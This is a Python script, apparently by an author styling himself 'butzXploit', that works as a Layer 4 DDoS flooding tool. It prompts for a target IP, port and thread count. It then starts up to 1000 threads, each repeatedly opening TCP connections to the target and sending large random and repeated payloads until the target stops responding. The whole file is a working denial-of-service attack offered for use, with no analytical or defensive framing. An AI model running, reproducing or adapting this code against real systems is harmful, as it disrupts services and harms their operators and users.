# -*- coding: utf-8 -*-
# Full Brutal V2 (Ganas Mode No Sound) by butzXploit
import os, threading, socket, random, time

os.system("clear")
print('''
\x1b[1;91m╔═════════════════════════════════════════════════╗
║     \x1b[1;97mFull Brutal DDoS Ganas Mode by \x1b[1;96mbutzXploit\x1b[1;91m     ║
║   \x1b[1;93mFlood Auto-Disconnect Target | Layer 4 Extreme   ║
╚═════════════════════════════════════════════════╝\x1b[0m
''')

payloads = [
    random._urandom(1024),
    random._urandom(2048),
    b"X-Flood" * 1024,
    b"BUTZ" * 4096,
    random._urandom(8192)
]

def flood(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            for payload in payloads:
                s.send(payload)
            print(f"\x1b[1;92m[✓] Sent brutal packet to {target}:{port}\x1b[0m")
            s.close()
        except socket.error:
            print(f"\x1b[1;91m[-] Target {target} DOWN or BLOCKED!\x1b[0m")
            break
        except:
            pass

target = input("IP Target: ")
port = int(input("Port Target (80/443/22): "))
threads = int(input("Jumlah Threads (1000 max): "))

print("\n[!] Serangan dimulai... Auto Brutal Mode aktif!\n")
time.sleep(1)

for _ in range(threads):
    threading.Thread(target=flood, args=(target, port)).start()
